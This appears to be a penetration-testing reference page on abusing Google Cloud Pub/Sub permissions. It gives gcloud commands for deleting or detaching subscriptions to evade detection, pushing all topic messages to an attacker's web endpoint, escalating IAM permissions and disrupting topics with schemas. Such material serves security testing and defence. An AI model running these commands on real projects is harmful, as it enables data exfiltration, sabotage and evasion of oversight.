## Pub/Sub

For more information about Pub/Sub check the following page:

{% content-ref url="../gcp-services/gcp-pub-sub.md" %}
[gcp-pub-sub.md](../gcp-services/gcp-pub-sub.md)
{% endcontent-ref %}

### `pubsub.topics.publish`

Publish a message in a topic, useful to **send unexpected data** and trigger unexpected functionalities or exploit vulnerabilities:

```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```

### `pubsub.topics.detachSubscription`

Useful to prevent a subscription from receiving messages, maybe to avoid detection.

```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```

### `pubsub.topics.delete`

Useful to prevent a subscription from receiving messages, maybe to avoid detection.\
It's possible to delete a topic even with subscriptions attached to it.

```bash
gcloud pubsub topics delete <TOPIC NAME>
```

### `pubsub.topics.update`

Use this permission to update some setting of the topic to disrupt it, like `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Give yourself permission to perform any of the previous attacks.

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

Get all the messages in a web server:

{% code overflow="wrap" %}
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
{% endcode %}

Create a subscription and use it to **pull messages**:

```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```

### `pubsub.subscriptions.delete`

**Delete a subscription** could be useful to disrupt a log processing system or something similar:

```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```

### &#x20;`pubsub.subscriptions.update`

Use this permission to update some setting so messages are stored in a place you can access (URL, Big Query table, Bucket) or just to disrupt it.

### `pubsub.subscriptions.setIamPolicy`

Give yourself the permissions needed to perform any of the previously commented attacks.

### `pubsub.schemas.delete`

Delete a schema to be able to send messages that doesn't fulfil with the schema:

```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```

### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Attack a schema to a topic so the messages doesn't fulfil it and therefore the topic is disrupted.\
If there aren't any schemas you might need to create one.

{% code title="schema.json" %}
```json
{
    "namespace": "com.example",
    "type": "record",
    "name": "Person",
    "fields": [
        {
            "name": "name",
            "type": "string"
        },
        {
            "name": "age",
            "type": "int"
        }
    ]
}
```
{% endcode %}

```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
    --schema=projects/<project-name>/schemas/<topic-id> \
    --message-encoding=json
```

### `pubsub.schemas.setIamPolicy`

Give yourself the permissions needed to perform any of the previously commented attacks.

### `pubsub.snapshots.create`,  `pubsub.snapshots.seek`

This is will create a snapshot of all the unACKed messages and put them back to the subscription. Not very useful for an attacker but here it's:

```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
    --subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
    --snapshot=YOUR_SNAPSHOT_NAME
```
